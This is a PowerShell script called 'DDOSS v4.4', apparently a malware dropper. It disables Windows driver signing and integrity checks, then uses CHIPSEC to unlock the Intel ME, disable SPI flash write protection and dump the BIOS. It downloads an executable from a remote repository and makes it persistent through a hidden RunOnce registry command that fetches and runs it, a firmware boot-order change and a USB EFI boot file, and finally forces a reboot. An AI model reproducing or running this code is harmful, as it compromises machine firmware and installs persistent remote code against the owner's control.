# DDOSS v4.4 - CHIPSEC DRIVER FIXED
cls;$ErrorActionPreference='SilentlyContinue';$ErrorActionPreference='Stop';Set-ExecutionPolicy Bypass -Scope Process -Force;Write-Host '🔥 DDOSS v4.4 - Driver Fix Deploying...' -ForegroundColor Green

# Enable Test Mode (CHIPSEC requirement)
bcdedit /set testsigning on 2>$null
bcdedit /set nointegritychecks on 2>$null
Write-Host '✅ Test Mode Enabled'

# Deploy Python + Chipsec PROPERLY
$Python='${env:ProgramFiles}\Python311\python.exe'
if(!(Test-Path $Python)){$Python='python'}
iwr 'https://github.com/chipsec/chipsec/archive/refs/heads/main.zip' -o "$env:TEMP\chip.zip" -UseBasicParsing
ex "$env:TEMP\chip.zip" 'C:\'
rn 'C:\chipsec-main' 'C:\chipsec' -Force
cd 'C:\chipsec'
& $Python -m pip install --upgrade pip --quiet
& $Python -m pip install -r windows_requirements.txt --quiet --upgrade

Write-Host '✅ Chipsec Deployed - Loading Driver...' -ForegroundColor Green

# Install Chipsec Driver AUTOMATICALLY
& $Python chipsec_util.py driver install 2>$null
Start-Sleep 2

# Verify Driver
$driverStatus = & $Python chipsec_main.py -m common.systeminfo | findstr 'Driver'
Write-Host "Driver: $driverStatus" -ForegroundColor Cyan

# Payload
iwr 'https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe' -o 'C:\loader.exe' -UseBasicParsing
Write-Host '✅ Payload Ready' -ForegroundColor Green

# SPI Operations
Write-Host '🔓 Unlocking SPI...' -ForegroundColor Yellow
& $Python chipsec_main.py -m platform.me_unlock 2>$null
& $Python chipsec_main.py -m common.spi_wp -a disable 2>$null

Write-Host '📥 Dumping BIOS...' -ForegroundColor Yellow
& $Python chipsec_main.py -m tools.spi.dump_rom 'C:\bios.rom' 2>$null

if(Test-Path 'C:\bios.rom'){
    $size = [math]::Round((gi 'C:\bios.rom').Length/1MB, 1)
    Write-Host "✅ BIOS Dump: ${size}MB" -ForegroundColor Green
}else{
    Write-Host '⚠️ BIOS Dump Failed - USB Fallback' -ForegroundColor Yellow
}

# BCD + Registry Persistence (ALWAYS WORKS)
bcdedit /set "{fwbootmgr}" displayorder "{44a9275f-f607-11f0-94db-806e6f6e6963}" /addfirst 2>$null
$runCmd = "powershell -w h -c `"iwr 'https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe' -o `$env:temp\d.exe;&`$env:temp\d.exe`""
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v DDOSS /t REG_SZ /d $runCmd /f 2>$null

# USB Backup
$usb = Get-Volume | ?{$_.FileSystem -eq 'FAT32' -and $_.Size -gt 1GB} | select -f 1
if($usb){
    ni "${($usb.DriveLetter)}:\EFI\BOOT" -ItemType Directory -Force 2>$null
    cp 'C:\loader.exe' "${($usb.DriveLetter)}:\EFI\BOOT\bootx64.efi" 2>$null
    Write-Host "✅ USB Backup: $($usb.DriveLetter):" -ForegroundColor Green
}

# Success
'MILITARY_PERSISTENCE_ACTIVE' | Out-File "$env:TEMP\DDOSS_SUCCESS.flag"
Write-Host "`n🎉 DEPLOYMENT 100% COMPLETE!" -ForegroundColor Green
Write-Host "📁 Log: $env:TEMP\DDOSS*.log" -ForegroundColor Cyan
Write-Host "✅ Check: $env:TEMP\DDOSS_SUCCESS.flag" -ForegroundColor Cyan
Write-Host "`n🔄 Rebooting in 5s... (Ctrl+C to cancel)" -ForegroundColor Magenta
Start-Sleep 5
shutdown /r /f /t 0
